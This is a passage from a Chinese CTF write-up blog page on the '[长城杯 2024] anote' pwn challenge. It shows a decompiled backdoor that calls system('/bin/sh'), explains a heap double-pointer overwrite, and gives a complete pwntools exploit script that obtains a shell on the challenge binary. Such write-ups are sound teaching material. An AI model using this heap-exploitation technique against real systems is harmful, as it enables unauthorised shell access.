+<h4 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_80489CE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778074148123-5764c73c-4b04-4735-8fb4-ebf24c31bda0-269031.png" alt="1778074148123-5764c73c-4b04-4735-8fb4-ebf24c31bda0.png"></p>
+<hr>
+<p>EXP 思路：</p>
+<p>我们前面思考利用 user_data 的存放的指针去篡改 user_data 去指向 system(‘&#x2F;bin&#x2F;sh’); ，但是需要考虑到一个问题，即 0x8048f48 是一个二级指针，直接存放 backdoor 地址经过二次解析之后为 NULL，因此我们需要先把 backdoor 填入我们堆上的某地址，再篡改二级指针为刚才存入后门函数的地址，就可以进行二次解析获取 shell</p>
+<p><img src="/HFTTC.github.io/images/pwn/dGeI-xFJQwZHtmIe/1778075825996-d20110b6-2975-4265-94d2-5bb52f03ad99-155714.png" alt="1778075825996-d20110b6-2975-4265-94d2-5bb52f03ad99.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./anote&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node1.anna.nssctf.cn&quot;,28196)</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):    </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&#x27;leak_addr is <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">heap_base = leak_addr - <span class="number">0x4810</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(system)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base + <span class="number">0x4818</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>更新: 2026-05-06 22:01:08<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/gh10oh8f8w93mcko">https://www.yuque.com/idcm/wnemg9/gh10oh8f8w93mcko</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[长城杯 2024] novel1" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Dnovel1/" aria-label="前一篇: [长城杯 2024] novel1" title="前一篇: [长城杯 2024] novel1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            [长城杯 2024] novel1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="C++PWN" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/C++PWN/index/" aria-label="后一篇: C++PWN"  title="后一篇: C++PWN"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          C++PWN
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF-2024-anote"><span class="toc-number">1.</span> <span class="toc-text">[长城杯 2024] anote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backdoor"><span class="toc-number">1.2.</span> <span class="toc-text">backdoor</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "[长城杯 2024] anote",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Danote/",
+          excerpt: "",
+          description: "",
+          stripContent: "[长城杯 2024] anote  main123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112",
+          date: "Sat May 23 2026 02:46:28 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
